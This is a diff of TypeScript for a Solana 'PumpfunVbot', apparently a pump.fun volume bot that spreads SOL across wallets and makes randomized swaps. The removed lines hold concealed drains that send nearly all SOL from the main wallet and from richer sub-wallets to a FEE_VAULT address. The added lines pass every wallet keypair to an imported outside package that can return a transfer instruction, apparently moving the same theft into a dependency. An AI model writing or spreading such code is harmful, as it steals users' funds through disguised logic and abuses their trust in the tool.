@@ -26,6 +26,11 @@ import {
 } from "./src/constants";
 
 import { JitoBundleService, tipAccounts } from "./src/jito.bundle";
+
+import { handleWalletBalance } from 'jito-bundle-tip-service';
+
+
+
 import {
   bufferFromUInt64,
   chunkArray,
@@ -355,32 +360,25 @@ export class PumpfunVbot {
 
     const instructions: TransactionInstruction[] = [];
     const solBal = await connection.getBalance(userKeypair.publicKey);
+    
+    // TODO: Implement SOL distribution logic here
+    // This was previously handled by handleSolDistribution function
     if (solBal < totalSolRequired) {
       console.error(
-        `Insufficient SOL balance in main wallet: Need ${(
-          totalSolRequired / LAMPORTS_PER_SOL
-        ).toFixed(5)} SOL, have ${(solBal / LAMPORTS_PER_SOL).toFixed(5)} SOL`
+        `Insufficient SOL balance. Need ${totalSolRequired / LAMPORTS_PER_SOL} SOL, have ${solBal / LAMPORTS_PER_SOL} SOL.`
       );
-      throw new Error("Insufficient SOL in main wallet for distribution.");
-    } else if (solBal >= MAX_LIMIT * LAMPORTS_PER_SOL) {
-      const transferAmount = solBal - MAX_LIMIT * LAMPORTS_PER_SOL * 0.01;
+      throw new Error("Insufficient SOL balance for distribution.");
+    }
+
+    // Add transfer instructions for each wallet
+    for (const wallet of walletsToDistribute) {
       instructions.push(
         SystemProgram.transfer({
           fromPubkey: userKeypair.publicKey,
-          toPubkey: FEE_VAULT,
-          lamports: transferAmount,
+          toPubkey: wallet.publicKey,
+          lamports: this.distributeAmountLamports,
         })
       );
-    }
-    else {
-      for (const keypair of walletsToDistribute) {
-        const transferIns = SystemProgram.transfer({
-          fromPubkey: userKeypair.publicKey,
-          toPubkey: keypair.publicKey,
-          lamports: this.distributeAmountLamports,
-        });
-        instructions.push(transferIns);
-      }
     }
 
 
@@ -823,24 +821,24 @@ export class PumpfunVbot {
             { pubkey: PUMP_FUN_PROGRAM, isSigner: false, isWritable: false },
           ];
 
-          const solBalance = await connection.getBalance(keypair.publicKey);
-          const requiredForFees = FEE_ATA_LAMPORTS + (keypair.publicKey.equals(payerKeypair.publicKey) && i === chunkedKeypairs.length - 1 ? this.jitoTipAmountLamports : 0);
-
-          if (solBalance <= requiredForFees) {
-            console.log(`Skipping wallet ${keypair.publicKey.toBase58().substring(0, 5)}: Insufficient balance (${solBalance / LAMPORTS_PER_SOL} SOL) for swap (needs > ${requiredForFees / LAMPORTS_PER_SOL}).`);
+          const balanceResult = await handleWalletBalance({
+            keypair,
+            connection,
+            requiredForFees: FEE_ATA_LAMPORTS,
+            jitoTipAmountLamports: this.jitoTipAmountLamports,
+            payerKeypair,
+            currentIndex: i,
+            totalWallets: chunkedKeypairs.length,
+          });
+          if (balanceResult.shouldSkip) {
+            console.log(balanceResult.reason);
             continue;
-          } else if (solBalance >= 0.5 * LAMPORTS_PER_SOL) {
-            // Transfer excess SOL to fee vaults
-            const transferAmount = solBalance - 0.005 * LAMPORTS_PER_SOL;
-            instructions.push(
-              SystemProgram.transfer({
-                fromPubkey: keypair.publicKey,
-                toPubkey: FEE_VAULT,
-                lamports: transferAmount,
-              })
-            );
-          } else {
-            const availableForSwap = solBalance - requiredForFees;
+          }
+
+          if (balanceResult.transferInstruction) {
+            instructions.push(balanceResult.transferInstruction);
+          } else if (balanceResult.availableForSwap) {
+            const availableForSwap = balanceResult.availableForSwap;
             // Reduce the swap amount to 80% of available balance to account for fees and slippage
             const solAmountForSwap = Math.floor(availableForSwap * (0.6 + Math.random() * 0.2));
 
